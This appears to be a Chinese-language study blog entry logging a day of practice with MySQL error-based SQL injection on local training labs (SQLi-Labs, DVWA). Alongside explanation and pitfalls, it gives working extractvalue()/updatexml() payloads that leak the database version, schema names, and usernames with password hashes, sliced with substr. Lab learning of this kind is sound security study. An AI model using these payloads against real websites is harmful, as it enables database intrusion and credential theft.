## 二、实操过程记录

### 阶段 1：寻找报错环境（15 分钟）

先确认页面会不会把 MySQL 错误信息打出来。不会回显错误的站点，报错注入无从下手，这是前提条件。

```sql
# 先用单引号触发语法错误
http://127.0.0.1:8080/Less-5/?id=1'
# 若页面出现类似下面的内容，说明错误回显开着
You have an error in your SQL syntax; check the manual ... near "'' at line 1"
```
使用的测试环境：SQLi-Labs Less-5（单引号）与 Less-6（双引号）。

Less-5 输入 1' 页面直接回显 MySQL 语法错误，确认错误回显开启。

DVWA 对比：DVWA 用 @mysqli_num_rows 抑制了报错，所以那边只能盲注，不能报错注入。

### 阶段 2：extractvalue() 报错注入（30 分钟）

extractvalue(xml, xpath) 的第二个参数必须是合法 XPath。把数据拼成 ~数据~ 塞进去，XPath 解析失败，错误信息就会带上这段内容。

```sql
# 数据库版本
?id=1’ and extractvalue(1, concat(0x7e, version(), 0x7e))--+
# 当前数据库名
?id=1’ and extractvalue(1, concat(0x7e, database(), 0x7e))--+
# 当前用户
?id=1’ and extractvalue(1, concat(0x7e, user(), 0x7e))--+
```
数据库版本：5.7.26（错误信息中显示 XPATH syntax error: '~5.7.26~'）。

数据库名：security。

用户名：root@localhost。

0x7e 是波浪号 ~，作用是把数据包在中间，方便从错误串里定位。

![extractvalue 报错带出版本与库名（1）](/images/csdn/week06/day-033-2.png)
![extractvalue 报错带出版本与库名（2）](/images/csdn/week06/day-033-3.png)

### 阶段 3：updatexml() 报错注入（30 分钟）

updatexml(xml, xpath, new_value) 是另一条同样的路，第二个参数非法就报错。两个函数互为备份——有的版本会禁用其中一个。

```sql
# 表名
?id=1’ and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)--+
# 列名
?id=1’ and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1)--+
```
获取的表名：emails（Less-5 的 security 库里第一张表）。

获取的列名：user_id（users 表第一列）。

换 limit 1,1 / limit 2,1 就能依次拿到后续的行。

### 阶段 4：分段获取长数据（30 分钟）

报错信息有长度上限（约 32 字符），而 group_concat 出来的结果往往上百字符。解决办法是用 substr 切片，一段一段取。

```sql
# 前 30 个字符
?id=1’ and extractvalue(1, concat(0x7e, substr((select group_concat(
username,0x3a,password) from users), 1, 30), 0x7e))--+
# 第 31-60 个字符
?id=1’ and extractvalue(1, concat(0x7e, substr((select group_concat(
username,0x3a,password) from users), 31, 30), 0x7e))--+
```
获取的密码哈希（前 30 位）：admin:5f4dcc3b5aa765d61d8327de

（第 31 位起接着取：b882cf99…，直到整段哈希拼完整）

分段点：每段 30 字符，从 1、31、61 依次往后切，直到取空。

注意：extractvalue 一次只回显一个错误，所以要按顺序切片，不能并行。

![分段获取 users 表账号密码](/images/csdn/week06/day-033-6.png)

### 阶段 5：底层补课——为什么能报错带数据

extractvalue / updatexml 的第二个参数会被当成 XPath 解析。XPath 只允许节点路径表达式，遇到 ~xxx~ 这种非法字符就抛异常，而 MySQL 的异常信息会把出错的表达式原样带出来。

| 函数 | 参数结构 | 报错条件 |
| --- | --- | --- |
| extractvalue | extractvalue(xml, xpath) | xpath 非法（含 ~、特殊符号） |
| updatexml | updatexml(xml, xpath, new_value) | 同上 |
| geometrycollection | geometrycollection(子查询) | 子查询返回非几何数据 |

> 结论：报错注入的本质是「借异常信息做数据外带」，所以它依赖两个条件——错误回显开启、函数未被禁用。

### 阶段 6：避坑记录

| 坑点 | 症状 | 解决办法 |
| --- | --- | --- |
| 页面不回显错误 | 只显示查询失败 | 换靶场（SQLi-Labs）或找开启 debug 的站点 |
| 数据被截断 | 只显示 32 字符 | 用 substr 分段取 |
| 函数被禁用 | 报函数不存在 | 换 updatexml / geometrycollection |
| 括号写错 | 语法错误而非 XPATH 错误 | concat 里外层括号要配对 |

Q：报错注入和 Union 注入怎么选？A：有回显位用 Union，没回显位但有报错用报错注入。

Q：为什么 DVWA 不行？A：DVWA 抑制了 MySQL 错误输出。

## 三、实践心得

1. 报错注入最妙的地方在于「借力」：它不要求页面有数据回显位，只要求页面把错误信息说出来。错误信息本身，就是一种回显。

2. extractvalue 和 updatexml 是同一个套路的两个入口。真正要理解的是「为什么非法 XPath 会带出原文」，而不是背 payload。

3. 32 字符的限制让我第一次意识到「带宽」这个概念：每次注入能带出的信息量是有限的，所以长数据必须切片。

## 四、重点与难点

1. 必须记住的知识点

① 报错注入两个前提：错误信息回显、相关函数没被禁用。

② extractvalue(xml, xpath) 与 updatexml(xml, xpath, new) 的第二个参数是关键。

③ 0x7e 是 ~，用来在错误串里标记数据边界。

④ 单次回显约 32 字符，长数据用 substr 分段。

2. 踩过的坑

① 在 DVWA 上试了半天没反应，才想起 DVWA 根本不回显 MySQL 错误。

② concat 里少写一层括号，报的是语法错误而不是 XPATH 错误，一度以为函数不能用。

③ 用 group_concat 直接取，结果被截断成 30 个字符，误以为数据只有这么长。

3. 需要补的课

① 补课：MySQL 5.1+ 的函数报错注入还有哪些可用函数。

② 补课：报错注入在 MySQL 8 上的变化（部分函数行为调整）。

③ 预习：Day 034 WAF 绕过，防护存在时怎么把 payload 送进去。

## 六、今日总结

今天学会了第三条取数据的路：不用回显位，也不用慢慢猜，直接让数据库把答案写在错误里。

报错注入的速度和 Union 注入接近，前提是错误回显开着。所以实战里第一件事永远是「先扔一个单引号，看它报不报错」。

三种注入的分工现在很清楚了：有回显用 Union，没回显有报错用报错注入，什么都没有才上盲注。
